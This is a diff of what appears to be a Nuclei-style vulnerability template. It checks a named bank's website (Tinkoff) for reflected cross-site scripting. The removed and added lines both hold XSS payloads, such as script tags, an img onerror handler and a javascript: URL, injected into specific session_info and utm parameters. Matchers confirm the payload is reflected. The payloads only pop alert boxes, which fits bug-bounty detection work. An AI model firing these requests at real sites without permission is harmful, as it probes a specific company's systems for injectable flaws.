@@ -4,26 +4,30 @@ info:
   name: Tinkoff - Cross-Site Scripting (XSS)
   author: bugbounty
   severity: high
-  description: XSS in session_info, utm parameters, and API endpoints
+  description: Reflected XSS in session_info and utm parameters
   tags: xss,tinkoff
+  reference:
+    - https://portswigger.net/web-security/cross-site-scripting
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/api/common/v1/session_info?platform=<script>alert(1)</script>&sessionid=test"
-      - "{{BaseURL}}/api/common/v1/mobile_info?platform=\"><script>alert(1)</script>&sessionid=test"
-      - "{{BaseURL}}/cards/debit-cards/tinkoff-black/?utm_source=javascript:alert(1)"
-      - "{{BaseURL}}/invest/stocks?utm_medium=<img src=x onerror=alert(1)>"
-      - "{{BaseURL}}/api/common/v1/session_info?sessionid='><script>alert(document.domain)</script>"
+  - raw:
+      - |
+        GET /api/common/v1/session_info?platform="><script>alert(document.domain)</script>&sessionid=test HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml
+
+      - |
+        GET /cards/debit-cards/tinkoff-black/?utm_source="><img src=x onerror=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
 
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "<script>alert"
-          - "javascript:alert"
-          - "onerror=alert"
+          - '"><script>alert(document.domain)</script>'
+          - '"><img src=x onerror=alert(document.domain)>'
         condition: or
 
       - type: word
@@ -34,3 +38,11 @@ http:
       - type: status
         status:
           - 200
+
+      - type: word
+        part: header
+        words:
+          - "X-XSS-Protection: 0"
+          - "X-Content-Type-Options"
+        negative: true
+        condition: or
